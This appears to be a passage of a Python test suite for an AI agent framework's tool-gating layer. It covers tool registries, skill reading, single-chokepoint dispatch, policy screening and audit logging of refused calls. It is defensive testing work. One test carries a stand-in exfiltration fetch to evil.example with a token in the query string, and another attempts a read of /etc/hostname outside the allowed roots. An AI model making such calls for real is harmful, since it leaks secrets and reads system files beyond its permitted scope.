        no_mutation = builtin_registry().without_kind("write", "exec")
        assert no_mutation.names() == ["consult", "fetch", "glob", "grep", "read", "skill"]

    def test_without_kind_removes_a_non_builtin_tool_of_the_same_kind(self) -> None:
        registry = builtin_registry()
        registry.register(
            Tool(
                name="mcp__fake__danger",
                description="a namespaced tool no denylist names explicitly",
                parameters={"type": "object", "properties": {}},
                handler=lambda args, ctx: ToolOutcome(True, content="ran"),
                kind="write",
            )
        )
        narrowed = registry.without_kind("write")
        assert "mcp__fake__danger" not in narrowed
        assert "write" not in narrowed and "edit" not in narrowed
        assert "read" in narrowed and "bash" in narrowed  # exec-kind untouched


class TestSkillTool:
    """The ``skill`` built-in (ADR 0013 §3 rule 8): read a discovered skill's body on
    demand, through the same chokepoint and denial path as every other tool."""

    def _write_skill(self, roots: tuple[Path, ...], name: str, body: str) -> None:
        skill_dir = roots[0] / ".docket" / "skills" / name
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text(
            f"---\nname: {name}\ndescription: One sentence.\n---\n\n{body}\n", encoding="utf-8"
        )

    def test_reads_a_discovered_skills_body(self, ctx: ToolContext) -> None:
        self._write_skill(ctx.roots, "security-review", "CHECKLIST-BODY-MARKER")

        res = dispatch_tool(_call("skill", '{"name":"security-review"}'), ctx, builtin_registry())

        assert res.ok
        assert "CHECKLIST-BODY-MARKER" in res.content

    def test_unknown_skill_name_fails_naming_the_known_names(self, ctx: ToolContext) -> None:
        self._write_skill(ctx.roots, "security-review", "body")

        res = dispatch_tool(_call("skill", '{"name":"no-such-skill"}'), ctx, builtin_registry())

        assert not res.ok
        assert "no-such-skill" in res.error
        assert "security-review" in res.error

    def test_a_denied_skill_tool_is_a_typed_denial_not_executed(self, ctx: ToolContext) -> None:
        self._write_skill(ctx.roots, "security-review", "body")
        no_skill = builtin_registry().without("skill")

        res = dispatch_tool(_call("skill", '{"name":"security-review"}'), ctx, no_skill)

        assert res.denied
        assert res.executed is False


class TestSinglePathToExecution:
    """The architectural invariant, checked against the tree rather than
    asserted in prose: if a second module can call a handler directly, the gate
    is optional, and an optional gate is not a gate."""

    # core/mcp_tools.py / edges/adapters/mcp_client.py:
    # both reference toolbox.py's `ToolOutcome` -- the inert "what happened"
    # result dataclass every Tool.handler must return -- so an MCP-adapted
    # tool's handler can construct one, exactly as core/tools.py's own
    # built-in handlers do. Neither file imports, or ever calls, an actual
    # handler *function* (read_file/write_file/edit_file/glob_files/
    # grep_files/run_bash); dispatch_tool remains the only thing that ever
    # invokes a Tool's handler. Confirmed by this file's own
    # `test_the_gate_is_consulted_by_dispatch_itself`-style reasoning, and by
    # `tests/integration/test_mcp_client.py`'s `TestGatedExactlyLikeABuiltin`,
    # which dispatches an MCP-adapted tool through the real, unmodified
    # `dispatch_tool` and proves a `pre_tool_call` policy gates it.
    #
    # edges/adapters/fetch.py: same shape again --
    # it imports `ToolOutcome` only, to construct the return value its own
    # `fetch_url` handler function produces. `core/tools.py`'s `fetch`
    # registration calls `fetch_url` directly (the same way it calls
    # `toolbox.read_file` et al.); nothing outside `dispatch_tool` ever does.
    ALLOWED_IMPORTERS: ClassVar[set[str]] = {
        "core/tools.py",
        "edges/adapters/toolbox.py",
        "core/mcp_tools.py",
        "edges/adapters/mcp_client.py",
        "edges/adapters/fetch.py",
    }

    @staticmethod
    def _imports_toolbox(tree: ast.AST) -> bool:
        for node in ast.walk(tree):
            if isinstance(node, ast.ImportFrom):
                if "toolbox" in (node.module or "") or any(
                    alias.name == "toolbox" for alias in node.names
                ):
                    return True
            elif isinstance(node, ast.Import) and any(
                "toolbox" in alias.name for alias in node.names
            ):
                return True
        return False

    def test_only_the_chokepoint_imports_the_handler_module(self) -> None:
        offenders = [
            rel
            for path in sorted((REPO_ROOT / "src" / "docket").rglob("*.py"))
            if (rel := path.relative_to(REPO_ROOT / "src" / "docket").as_posix())
            not in self.ALLOWED_IMPORTERS
            and self._imports_toolbox(ast.parse(path.read_text()))
        ]
        assert not offenders, f"handlers reachable outside the chokepoint from: {offenders}"

    def test_the_gate_is_consulted_by_dispatch_itself(self) -> None:
        """`evaluate_tool_call` must be called from inside `dispatch_tool` — a gate invoked by callers instead is a gate callers can skip."""
        source = Path(core_tools.__file__).read_text()
        tree = ast.parse(source)
        dispatch = next(
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.FunctionDef) and node.name == "dispatch_tool"
        )
        called = {
            node.func.id
            for node in ast.walk(dispatch)
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
        }
        assert "evaluate_tool_call" in called

    def test_handlers_hold_no_policy_vocabulary(self) -> None:
        """toolbox.py must not grow its own gate: two places that can decide means one of them will be forgotten. Checks *identifiers*, not raw text — the module docstring legitimately says the words "approval" and "policy" while explaining that it holds neither, and a substring scan would force that explanation out of the file to stay green."""
        tree = ast.parse(Path(toolbox.__file__).read_text())
        identifiers: set[str] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Name):
                identifiers.add(node.id)
            elif isinstance(node, ast.Attribute):
                identifiers.add(node.attr)
            elif isinstance(node, ast.ImportFrom):
                identifiers.update(alias.name for alias in node.names)
                identifiers.add(node.module or "")
            elif isinstance(node, ast.Import):
                identifiers.update(alias.name for alias in node.names)

        forbidden = {
            "classify_command",
            "match_high_risk",
            "SAFE_BINS",
            "HIGH_RISK_PATTERNS",
            "evaluate_tool_call",
            "docket.core.security",
            "docket.core.approval",
            "docket.core.policy",
        }
        leaked = forbidden & identifiers
        assert not leaked, f"policy vocabulary leaked into the handler module: {sorted(leaked)}"


_POD_INPUT_BLOCK = """kind: policy
name: block-canary
appliesTo: ["*"]
on: input
when:
  matches: 'CANARY-PHRASE'
then: block
message: canary
"""


@pytest.fixture()
def pod_input_policy(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """A home whose pod `mypod` carries one `on: input` block policy and no global ones."""
    from tests.conftest import repoint_docket_home

    home = tmp_path / "home"
    repoint_docket_home(monkeypatch, home)
    policies = _cfg.pod_config_dir("mypod") / "policies"
    policies.mkdir(parents=True)
    (policies / "block-canary.yaml").write_text(_POD_INPUT_BLOCK)
    _cfg.POLICIES_DIR.mkdir(parents=True, exist_ok=True)
    return home


class TestUntrustedResultScreensSeeThePodPolicy:
    """`screen_tool_result` evaluates the calling pod's `on: input` policies, and a skill's body
    passes through it like a fetched page."""

    def test_a_tool_result(self, pod_input_policy: Path) -> None:
        out = core_tools.screen_tool_result(
            "implementer",
            ToolOutcome(True, content="CANARY-PHRASE"),
            source="fetch",
            detail="x",
            blocked_action="a.blocked",
            warn_action="a.warn",
            project="mypod",
        )
        assert out.ok is False

    def test_a_skill_body(self, pod_input_policy: Path, tmp_path: Path) -> None:
        ws = tmp_path / "ws"
        skill = ws / ".docket" / "skills" / "deploy"
        skill.mkdir(parents=True)
        (skill / "SKILL.md").write_text("---\nname: deploy\ndescription: d\n---\nCANARY-PHRASE\n")
        ctx = ToolContext(agent_id="a", roots=(ws,), timeout=5, project="mypod", role="implementer")
        out = core_tools._skill_read({"name": "deploy"}, ctx)
        assert out.ok is False
        assert "CANARY-PHRASE" not in (out.content or "")


class TestRefusedCallsAreAudited:
    """A refusal made inside a handler leaves one `tool.refused` audit entry."""

    @staticmethod
    def _refused() -> list[dict[str, object]]:
        from docket.core.audit import read_audit

        return [e for e in read_audit() if e.get("action") == "tool.refused"]

    def test_a_read_outside_the_roots_is_audited_once(self, ctx: ToolContext) -> None:
        result = dispatch_tool(
            _call("read", json.dumps({"path": "/etc/hostname"})), ctx, builtin_registry()
        )
        assert not result.ok
        (entry,) = self._refused()
        detail = str(entry["detail"])
        assert "tool=read" in detail and "kind=path_escape" in detail
        assert "path='/etc/hostname'" in detail

    def test_a_fetch_off_the_allowlist_is_audited_once(
        self, ctx: ToolContext, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from docket.edges.adapters import fetch as fetch_mod

        monkeypatch.setattr(fetch_mod, "_allowed_domains", lambda: frozenset({"ok.example"}))
        monkeypatch.setattr(_cfg, "FETCH_ALLOWED_DOMAINS", ("ok.example",), raising=True)
        url = json.dumps({"url": "https://evil.example/x?token=SECRETQ"})
        dispatch_tool(_call("fetch", url), ctx, builtin_registry())
        (entry,) = self._refused()
        detail = str(entry["detail"])
        assert "tool=fetch" in detail and "kind=fetch_not_allowed" in detail
        assert "evil.example" in detail and "SECRETQ" not in detail

    def test_an_allowed_call_and_an_ordinary_failure_write_nothing(self, ctx: ToolContext) -> None:
        ok = dispatch_tool(_call("read", json.dumps({"path": "notes.md"})), ctx, builtin_registry())
        missing = dispatch_tool(
            _call("read", json.dumps({"path": "nope.md"})), ctx, builtin_registry()
        )
        assert ok.ok and not missing.ok
        assert self._refused() == []
